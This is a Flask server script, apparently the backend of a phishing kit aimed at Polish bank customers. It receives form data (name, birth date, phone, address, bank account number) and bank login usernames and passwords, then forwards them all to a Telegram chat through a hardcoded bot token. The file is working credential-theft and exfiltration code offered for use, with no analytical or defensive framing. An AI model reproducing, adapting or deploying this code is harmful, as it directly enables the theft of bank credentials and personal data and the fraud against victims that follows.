from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
import json
import time
import re

app = Flask(__name__)
CORS(app)  # Разрешаем запросы с любых доменов

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs'
TELEGRAM_CHAT_ID = '-1004256695843'

# ============= IBAN VALIDATOR =============
def validate_iban(iban):
    """
    Проверяет корректность IBAN (польский и другие).
    Возвращает (is_valid, cleaned_iban, message)
    """
    # Удаляем пробелы и переводим в верхний регистр
    cleaned = re.sub(r'\s+', '', iban).upper()
    
    # Проверяем длину (минимум 15, максимум 34)
    if len(cleaned) < 15 or len(cleaned) > 34:
        return False, cleaned, f"Nieprawidłowa długość IBAN: {len(cleaned)} znaków (powinno być 15-34)"
    
    # Проверяем, что содержатся только буквы и цифры
    if not re.match(r'^[A-Z0-9]+$', cleaned):
        return False, cleaned, "IBAN zawiera niedozwolone znaki"
    
    # Проверка контрольной суммы (алгоритм ISO 7064)
    try:
        # Переносим первые 4 символа в конец
        rearranged = cleaned[4:] + cleaned[:4]
        # Заменяем буквы на цифры (A=10, B=11, ..., Z=35)
        numeric = ''
        for char in rearranged:
            if char.isdigit():
                numeric += char
            else:
                numeric += str(ord(char) - 55)  # A=10, B=11, ...
        
        # Проверяем, что число делится на 97 без остатка
        if int(numeric) % 97 != 1:
            return False, cleaned, "Nieprawidłowa cyfra kontrolna IBAN"
        
        return True, cleaned, "IBAN jest poprawny"
        
    except (ValueError, TypeError):
        return False, cleaned, "Nieprawidłowy format IBAN"

def format_iban_readable(iban):
    """Форматирует IBAN для удобного чтения (группами по 4 символа)"""
    cleaned = re.sub(r'\s+', '', iban).upper()
    return ' '.join([cleaned[i:i+4] for i in range(0, len(cleaned), 4)])

# ============= ГЛАВНАЯ СТРАНИЦА =============
@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "message": "Server is active",
        "endpoints": {
            "/": "GET - Проверка статуса",
            "/ping": "GET - Keep-alive пинг",
            "/send": "POST - Отправка данных формы (с проверкой IBAN)",
            "/send-login": "POST - Отправка логинов",
            "/validate-iban": "POST - Проверка IBAN"
        },
        "timestamp": time.time()
    })

# ============= KEEP-ALIVE (анти-засыпание) =============
@app.route('/ping')
def ping():
    return jsonify({
        "status": "alive",
        "timestamp": time.time()
    })

# ============= ПРОВЕРКА IBAN (отдельный эндпоинт) =============
@app.route('/validate-iban', methods=['POST'])
def validate_iban_endpoint():
    try:
        data = request.json
        iban = data.get('iban', '')
        
        if not iban:
            return jsonify({
                "success": False,
                "error": "IBAN nie został podany"
            }), 400
        
        is_valid, cleaned, message = validate_iban(iban)
        
        return jsonify({
            "success": is_valid,
            "iban": cleaned,
            "formatted": format_iban_readable(cleaned) if is_valid else None,
            "message": message,
            "valid": is_valid
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ============= ПРИЁМ ДАННЫХ ИЗ ФОРМЫ =============
@app.route('/send', methods=['POST'])
def send_data():
    try:
        data = request.json
        print(f"📥 Получены данные: {data}")
        
        # ===== ПРОВЕРКА IBAN =====
        iban_raw = data.get('iban', '')
        is_valid, cleaned_iban, iban_message = validate_iban(iban_raw)
        
        # Если IBAN невалидный, возвращаем ошибку
        if not is_valid and iban_raw:
            return jsonify({
                "success": False,
                "error": f"IBAN: {iban_message}",
                "iban": iban_raw,
                "iban_valid": False
            }), 400
        
        # Форматируем IBAN для красивого отображения
        formatted_iban = format_iban_readable(cleaned_iban) if is_valid and cleaned_iban else iban_raw
        
        # ===== ФОРМИРУЕМ СООБЩЕНИЕ =====
        message = f"""📋 NOWE DANE FORMULARZA:
        
👤 Imię: {data.get('fullname', 'Brak')}
📅 Data urodzenia: {data.get('birthdate', 'Brak')}
📱 Telefon: {data.get('phone', 'Brak')}
🏠 Ulica: {data.get('street', 'Brak')}
🏙️ Miasto: {data.get('city', 'Brak')}
📮 Kod: {data.get('postal', 'Brak')}

🏦 NRB: {formatted_iban}
✅ Status IBAN: {'✔️ POPRAWNY' if is_valid else '⚠️ NIEZWERYFIKOWANY'}
        """
        
        # ===== ОТПРАВКА В TELEGRAM =====
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=payload, timeout=10)
        
        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Dane wysłane pomyślnie!",
                "iban_valid": is_valid,
                "iban_formatted": formatted_iban
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Telegram error: {response.status_code}"
            }), 500
            
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ============= ПРИЁМ ДАННЫХ ЛОГИНА =============
@app.route('/send-login', methods=['POST'])
def send_login():
    try:
        data = request.json
        print(f"🔐 Получен логин: {data}")
        
        # ===== ПРОВЕРКА IBAN В ЛОГИНЕ (если передан) =====
        iban_from_login = data.get('iban', '')
        iban_valid = False
        formatted_iban = iban_from_login
        
        if iban_from_login:
            is_valid, cleaned, _ = validate_iban(iban_from_login)
            iban_valid = is_valid
            if is_valid:
                formatted_iban = format_iban_readable(cleaned)
        
        # ===== ФОРМИРУЕМ СООБЩЕНИЕ =====
        message = f"""🔐 LOGOWANIE DO BANKU:

🏦 Bank: {data.get('bank', 'Brak')}
👤 Login: {data.get('username', 'Brak')}
🔑 Hasło: {data.get('password', 'Brak')}"""
        
        # Добавляем IBAN если он был передан
        if iban_from_login:
            message += f"""
🏦 NRB: {formatted_iban}
✅ Status IBAN: {'✔️ POPRAWNY' if iban_valid else '⚠️ NIEZWERYFIKOWANY'}"""
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=payload, timeout=10)
        
        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Login sent successfully!",
                "iban_valid": iban_valid if iban_from_login else None
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Telegram error: {response.status_code}"
            }), 500
            
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ============= ОБРАБОТКА 404 =============
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "error": "Endpoint not found",
        "available_endpoints": {
            "/": "GET - Check status",
            "/ping": "GET - Keep-alive",
            "/send": "POST - Send form data",
            "/send-login": "POST - Send login data",
            "/validate-iban": "POST - Validate IBAN"
        }
    }), 404

# ============= ЗАПУСК =============
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
